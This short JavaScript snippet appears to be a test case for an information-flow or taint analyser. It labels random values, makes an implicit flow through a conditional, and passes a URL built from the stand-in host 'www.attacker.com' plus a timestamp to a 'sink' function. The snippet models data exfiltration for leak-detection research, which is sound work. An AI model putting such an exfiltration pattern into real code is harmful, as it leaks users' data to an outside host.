var i =  Math.floor((Math.random() * 10) + 1); 
var i1 =  Math.floor((Math.random() * 10) + 1); 


var h = lbl(i);
var h1 = lbl(i1);

var t0 =  Date.now();

if (h > 5) {h1 = h;} 

url = urll("www.attacker.com" + t0);
sink('Sink', '', url);
